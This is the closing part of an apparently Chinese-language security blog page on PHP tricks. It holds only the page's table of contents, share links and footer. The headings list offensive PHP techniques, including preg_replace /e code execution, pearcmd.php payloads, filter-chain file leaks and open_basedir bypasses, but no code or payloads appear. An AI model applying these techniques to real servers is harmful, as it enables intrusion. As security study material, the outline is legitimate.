class="toc-text">preg_replace &#x2F;e 模式下的RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFpreg-replace-%E5%87%BD%E6%95%B0%EF%BC%9F"><span class="toc-number">8.1.</span> <span class="toc-text">什么是preg_replace()函数？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E5%BC%95%E7%94%A8"><span class="toc-number">8.2.</span> <span class="toc-text">反向引用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%B8%AD%E9%9D%9E%E6%B3%95%E5%8F%98%E9%87%8F%E7%9A%84%E8%A7%A3%E6%9E%90"><span class="toc-number">9.</span> <span class="toc-text">PHP中非法变量的解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pearcmd-php%E7%9A%84%E5%A6%99%E7%94%A8"><span class="toc-number">10.</span> <span class="toc-text">pearcmd.php的妙用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-register-argc-argv"><span class="toc-number">10.1.</span> <span class="toc-text">1. register_argc_argv</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-register-argc-argv%E5%92%8Cpear%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">10.2.</span> <span class="toc-text">2.register_argc_argv和pear的关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-payload"><span class="toc-number">10.3.</span> <span class="toc-text">3.payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%83%E9%80%B8eval%E4%B8%AD%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">11.</span> <span class="toc-text">逃逸eval中注释符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-filter-chains%E7%9A%84%E6%8A%A5%E9%94%99%E6%94%BB%E5%87%BB"><span class="toc-number">12.</span> <span class="toc-text">PHP filter chains的报错攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hash-file%E5%87%BD%E6%95%B0"><span class="toc-number">12.1.</span> <span class="toc-text">hash_file函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFPHP-filter-chains"><span class="toc-number">12.2.</span> <span class="toc-text">什么是PHP filter chains</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file%E5%87%BD%E6%95%B0"><span class="toc-number">12.3.</span> <span class="toc-text">file函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">12.4.</span> <span class="toc-text">攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8iconv%E8%A7%A6%E5%8F%91%E5%86%85%E5%AD%98%E9%94%99%E8%AF%AF"><span class="toc-number">12.4.1.</span> <span class="toc-text">利用iconv触发内存错误</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%B3%84%E6%BC%8F%E6%96%87%E4%BB%B6%E7%AC%AC1%E4%B8%AA%E5%AD%97%E7%AC%A6"><span class="toc-number">12.4.2.</span> <span class="toc-text">如何泄漏文件第1个字符</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pathinfo-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">13.</span> <span class="toc-text">pathinfo()函数绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pathinfo-%E5%87%BD%E6%95%B0"><span class="toc-number">13.1.</span> <span class="toc-text">pathinfo()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#move-uploaded-file%E7%9A%84%E4%B8%80%E4%B8%AA%E7%BB%86%E8%8A%82"><span class="toc-number">14.</span> <span class="toc-text">move_uploaded_file的一个细节</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#in-array-%E5%87%BD%E6%95%B0%E5%BC%B1%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">15.</span> <span class="toc-text">in_array() 函数弱比较漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#strcmp-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E"><span class="toc-number">16.</span> <span class="toc-text">strcmp()函数漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EPHP%E4%BC%98%E5%85%88%E7%BA%A7%E7%9A%84%E8%A7%84%E5%88%99"><span class="toc-number">17.</span> <span class="toc-text">关于PHP优先级的规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#finfo%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">18.</span> <span class="toc-text">finfo文件注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-open-basedir"><span class="toc-number">19.</span> <span class="toc-text">bypass open_basedir</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0bypass"><span class="toc-number">19.1.</span> <span class="toc-text">命令执行函数bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8glob-%E4%BC%AA%E5%8D%8F%E8%AE%AEBypass"><span class="toc-number">19.2.</span> <span class="toc-text">利用glob:&#x2F;&#x2F;伪协议Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DirectoryIterator-glob"><span class="toc-number">19.2.1.</span> <span class="toc-text">DirectoryIterator+glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#opendir-readdir-glob"><span class="toc-number">19.2.2.</span> <span class="toc-text">opendir()+readdir()+glob:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8chdir-%E4%B8%8Eini-set-%E7%BB%84%E5%90%88"><span class="toc-number">19.3.</span> <span class="toc-text">利用chdir()与ini_set()组合</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&text=PHP的一些小技巧"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&title=PHP的一些小技巧"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&is_video=false&description=PHP的一些小技巧"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=PHP的一些小技巧&body=Check out this article: https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&title=PHP的一些小技巧"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&title=PHP的一些小技巧"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&title=PHP的一些小技巧"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&title=PHP的一些小技巧"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&name=PHP的一些小技巧&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/3025/05/07/PHP%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/&t=PHP的一些小技巧"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        
<footer id="footer">
    <div class="footer-left">
        Copyright ©
        
        
        2024-2025
        wanTh3flag
        <br>
    </div>
    
    <div class="footer-right">
        <nav>
            <ul>
                <!--
                --><li><a href="/">H0me</a></li><!--
                --><!--
                --><li><a href="/about/">A6out</a></li><!--
                --><!--
                --><li><a href="/tags/">T6gs</a></li><!--
                --><!--
                --><li><a href="/categories/">Catagory</a></li><!--
                --><!--
                --><li><a href="/links/">L1nks</a></li><!--
                --><!--
                --><li><a href="/search/">s4arch</a></li><!--
                -->
            </ul>
            <ul>
                
                <!-- 不蒜子统计 -->
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
                
            </ul>
        </nav>
    </div>
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
